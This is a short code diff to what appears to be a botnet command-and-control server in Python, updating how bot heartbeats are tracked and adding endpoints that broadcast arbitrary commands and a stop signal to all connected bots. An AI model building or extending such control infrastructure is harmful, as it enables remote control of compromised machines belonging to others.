@@ -25,23 +25,28 @@ def disconnect():
     print("Socket disconnected")
 
 @sio.event
-def heartbeat(uuid: str):
+def heartbeat(data):
     global botnets
 
     botnet: BotnetActivity = None
     for b in botnets:
-        if b.uuid == uuid:
+        if b.uuid == data['uuid']:
             botnet = b
 
     if botnet is not None:
-        botnet.heartbeat()
+        botnet.heartbeat(data['running'])
     else:
-        botnets.append(BotnetActivity(uuid))
+        botnets.append(BotnetActivity(data['uuid'], data['running']))
 
 
-@app.route('/', methods=["POST"])
-def command_control():
+@app.route('/command', methods=["POST"])
+def send_command():
     emit("command", request.get_json(), namespace="/", broadcast=True)
+    return "Done"
+
+@app.route('/command/stop', methods=["POST"])
+def send_stop():
+    emit("stop", request.get_json(), namespace="/", broadcast=True)
     return "Done"
 
 @app.route('/botnets', methods=["GET"])
